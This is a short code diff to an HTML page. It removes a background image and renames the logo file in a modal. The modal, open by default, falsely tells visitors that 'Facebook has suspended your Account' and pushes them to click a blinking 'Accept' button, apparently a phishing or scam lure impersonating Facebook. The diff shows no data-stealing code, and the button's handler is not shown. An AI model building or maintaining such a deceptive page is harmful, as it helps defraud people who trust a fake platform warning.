@@ -445,9 +445,6 @@ body {
 </style>
 </head>
 <body>
-<div class="bgimg" style="top:0;filter: blur(0px);">
-          <img src="images/pic2.webp" alt="" width="100%">
-        </div>
 <script>
 // If an image fails to load, drop it so the colored block and initials show instead.
 document.querySelectorAll('img').forEach(img => {
@@ -484,7 +481,7 @@ document.querySelectorAll('.comment-box input').forEach(input => {
   <div id="modal-overlay" style="display: block;">
         <div id="modal-content">
             <span id="modal-close">×</span>
-            <img id="modal-image" src="images/logo-facebookpng-32251.jpg" alt="Facebook Logo">
+            <img id="modal-image" src="images/logofb.jpg" alt="Facebook Logo">
             <p id="modal-message">Facebook has suspended your Account. <br> Click "Accept" to continue using Facebook.</p>
             <div class="modal-buttons">
                 <button id="ctaBtn" class="dismiss blinking">Accept</button>
